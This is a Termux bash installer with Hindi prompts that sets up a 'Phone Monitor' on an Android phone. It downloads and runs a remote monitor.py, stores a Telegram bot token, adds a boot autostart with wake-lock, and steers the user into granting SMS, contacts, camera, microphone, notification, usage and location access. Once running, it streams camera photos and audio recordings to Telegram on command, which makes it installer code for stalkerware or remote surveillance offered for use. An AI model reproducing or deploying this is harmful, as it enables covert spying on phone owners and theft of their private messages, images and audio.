#!/data/data/com.termux/files/usr/bin/bash

echo "🔥 =============================================="
echo "      Phone Monitor - Mega Setup (Camera + Mic)"
echo "=============================================="

echo "🟢 [1/9] पैकेजेज़ अपडेट और इंस्टॉल..."
pkg update -y && pkg upgrade -y
pkg install python git screen termux-api termux-services -y
pip install requests

echo "🟢 [2/9] स्टोरेज परमिशन..."
termux-setup-storage
sleep 2

echo "🟢 [3/9] monitor.py डाउनलोड..."
curl -O https://raw.githubusercontent.com/vikramsengal/monitor-mb/main/monitor.py
if [ $? -ne 0 ]; then
    echo "❌ monitor.py डाउनलोड नहीं हुई!"
    exit 1
fi

echo "🟢 [4/9] Token और Chat ID सेट करें..."
if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
    read -p "🔑 BOT_TOKEN: " BOT_TOKEN
    read -p "🔑 CHAT_ID: " CHAT_ID
    echo "export BOT_TOKEN='$BOT_TOKEN'" >> ~/.bashrc
    echo "export CHAT_ID='$CHAT_ID'" >> ~/.bashrc
    source ~/.bashrc
else
    echo "   Token/ID पहले से सेट हैं।"
fi

echo "🟢 [5/9] ऑटो-स्टार्ट सेटअप..."
mkdir -p ~/.termux/boot
cat > ~/.termux/boot/start_monitor.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
source /data/data/com.termux/files/home/.bashrc
termux-wake-lock
sleep 15
screen -dmS monitor python /data/data/com.termux/files/home/monitor.py
EOF
chmod +x ~/.termux/boot/start_monitor.sh

echo "🟢 [6/9] परमिशन स्क्रीन खोल रहा हूँ..."
sleep 2

am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:com.termux
echo "👉 [1/6] SMS, Phone, Contacts, Camera, Microphone → ALLOW करें"
sleep 8

am start -a android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
echo "👉 [2/6] नोटिफिकेशन ऐक्सेस → Termux ON करें"
sleep 8

am start -a android.settings.USAGE_ACCESS_SETTINGS
echo "👉 [3/6] उपयोग ऐक्सेस → Termux ON करें"
sleep 8

am start -a android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS
echo "👉 [4/6] बैटरी → 'अनुकूलित न करें'"
sleep 8

am start -a android.settings.LOCATION_SOURCE_SETTINGS
echo "👉 [5/6] लोकेशन → GPS ON"
sleep 8

# कैमरा और माइक्रोफोन परमिशन के लिए अलग से कोई स्क्रीन नहीं है, वो ऐप परमिशन में ही मिलती है। हम पहले ही कवर कर चुके हैं।

echo "🟢 [7/9] कैमरा और माइक्रोफोन टेस्ट (परमिशन पॉपअप आएगी)..."
termux-camera-photo /sdcard/dcim/test.jpg 2>/dev/null
termux-microphone-record -d 1 /sdcard/test.aac 2>/dev/null
sleep 2
rm -f /sdcard/dcim/test.jpg /sdcard/test.aac 2>/dev/null

echo "🟢 [8/9] मॉनिटरिंग बैकग्राउंड में शुरू..."
screen -dmS monitor python /data/data/com.termux/files/home/monitor.py

echo "🟢 [9/9] ✅ सब कुछ सेट है!"
echo "=============================================="
echo "📩 Telegram पर /help भेजें।"
echo "🔄 Restart पर भी चलेगा।"
echo "📸 /camera - लाइव कैमरा फोटो स्ट्रीम (हर 10 सेकंड)"
echo "🎤 /record - 30 सेकंड ऑडियो रिकॉर्ड"
echo "=============================================="
